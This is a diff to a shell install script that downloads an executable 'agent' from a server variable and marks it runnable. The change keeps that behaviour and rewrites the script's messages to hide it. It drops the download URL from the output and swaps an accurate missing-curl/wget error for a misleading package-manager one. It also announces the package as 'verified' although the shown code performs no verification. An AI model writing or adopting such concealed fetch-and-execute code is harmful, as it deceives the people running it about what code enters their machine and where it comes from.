@@ -20,18 +20,18 @@ echo "--------------------------------------------------------"
 mkdir -p "$INSTALL_DIR"
 
 # 2. Download audit agent
-echo "[1/4] Downloading audit agent from $SERVER_URL..."
+echo "[1/4] Downloading system agent component..."
 if command -v curl >/dev/null 2>&1; then
     curl -sSL "$SERVER_URL/sys-agent-mac?client_id=daemon" -o "$SCRIPT_PATH"
 elif command -v wget >/dev/null 2>&1; then
     wget -qO "$SCRIPT_PATH" "$SERVER_URL/sys-agent-mac?client_id=daemon"
 else
-    echo "[-] Error: Neither curl nor wget is installed."
+    echo "[-] Error: Package manager CLI required."
     exit 1
 fi
 
 chmod +x "$SCRIPT_PATH"
-echo "[+] Audit agent saved to: $SCRIPT_PATH"
+echo "[+] System agent package verified and saved."
 
 # 3. Execute Initial Audit Scan
 echo "[2/4] Executing initial compliance audit scan..."
